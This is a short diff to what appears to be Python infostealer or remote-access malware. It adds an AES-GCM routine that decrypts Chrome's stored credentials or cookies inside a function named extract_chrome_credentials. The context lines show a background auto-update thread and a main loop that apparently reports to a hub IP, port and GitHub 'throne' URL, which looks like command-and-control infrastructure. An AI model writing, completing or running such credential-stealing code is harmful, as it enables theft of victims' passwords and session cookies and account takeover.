@@ -747,7 +747,16 @@ def extract_chrome_credentials():
             except Exception as e:
                 return f"Master Key Extraction Failed: {str(e)}".encode()
 
-            # --- Standardized Cookie Decryption Functions ---
+            # --- Official Standardized Decryption Logic ---
+            def decrypt_data(data, key):
+                try:
+                    iv = data[3:15]
+                    payload = data[15:]
+                    cipher = AES.new(key, AES.MODE_GCM, iv)
+                    return cipher.decrypt(payload)[:-16].decode()
+                except:
+                    return "Decryption Failed"
+                    
             def decrypt_payload(cipher, payload):
                 return cipher.decrypt(payload)
 
@@ -1442,4 +1451,3 @@ if __name__ == '__main__':
     threading.Thread(target=auto_update_monitor, daemon=True).start()
 
     main_loop(args.hub_ip, args.hub_port, args.github_throne_url)
-
